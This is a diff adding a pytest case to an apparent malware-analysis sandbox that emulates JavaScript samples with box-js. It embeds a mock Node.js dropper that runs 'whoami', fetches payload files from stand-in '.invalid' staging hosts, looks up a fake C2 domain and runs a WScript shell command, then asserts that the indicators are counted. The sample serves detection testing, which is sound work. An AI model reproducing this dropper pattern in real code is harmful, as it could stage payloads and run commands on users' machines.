@@ -134,3 +134,56 @@ def test_a_jscript_encoded_script_is_a_rejection_that_conforms(tmp_path, monkeyp
     res = BoxJsEngine().detonate(sample, out, Limits())
     assert res.status == "rejected"
     ec.assert_conforms(CONTRACT, res, out)
+
+
+# A node dropper: shells out and reaches the network through node's own modules, then
+# finishes its work on a later timers.setInterval tick and clears the interval itself (the
+# global setInterval is box-js's WSH stub, which runs the callback once).
+NODE_SAMPLE = r'''
+const cp = require("child_process"), https = require("https"), http = require("http"),
+      dns = require("dns"), timers = require("timers");
+cp.execSync("whoami");
+https.get("https://node-stage.invalid/p.bin", () => {}).on("error", () => {});
+http.get("http://node-stage.invalid/q.bin", () => {}).on("error", () => {});
+dns.lookup("node-c2.invalid", () => {});
+let ticks = 0;
+const t = timers.setInterval(() => {
+  ticks += 1;
+  cp.execSync("tick " + ticks);
+  if (ticks === 3) {
+    timers.clearInterval(t);
+    new ActiveXObject("WScript.Shell").Run("cmd /c echo third-tick", 0);
+  }
+}, 1000);
+'''
+
+
+@needs_boxjs
+def test_a_real_node_dropper_is_counted_and_its_interval_ends(tmp_path, monkeypatch):
+    """The node-module IOCs land in the exec/url families, and a self-clearing setInterval
+    repeats (box-js #3) and then lets the run end well inside its emulation budget."""
+    import time
+
+    monkeypatch.setenv(RUN_JS_ENV, str(RUN_JS))
+    sample = tmp_path / "node.js"
+    sample.write_text(NODE_SAMPLE)
+    out = tmp_path / "out"
+    out.mkdir()
+    started = time.monotonic()
+    res = BoxJsEngine().detonate(sample, out, Limits(timeout_s=60))
+    elapsed = time.monotonic() - started
+    assert res.status == "ok", res.payload.fields
+    ec.assert_conforms(CONTRACT, res, out)
+    assert "timeout" not in {w.code for w in res.warnings}
+    assert elapsed < 30, elapsed
+    f = res.payload.fields
+    # execSync, one execSync per tick, and the Run on the third tick: the interval repeated,
+    # and stopped at the clear (an uncleared one would tick on, up to box-js's cap).
+    assert f["exec_iocs"] == 2 + 3, f
+    assert f["url_iocs"] >= 3, f          # https.get, http.get, dns.lookup
+    iocs = json.loads((out / f["results_dir"] / "IOC.json").read_text())
+    assert any(i.get("type") == "Run" and "third-tick" in json.dumps(i.get("value"))
+               for i in iocs)
+    ticks = [i["value"]["command"] for i in iocs if i.get("type") == "process execSync()/exec()"
+             and str(i["value"].get("command", "")).startswith("tick ")]
+    assert ticks == ["tick 1", "tick 2", "tick 3"]
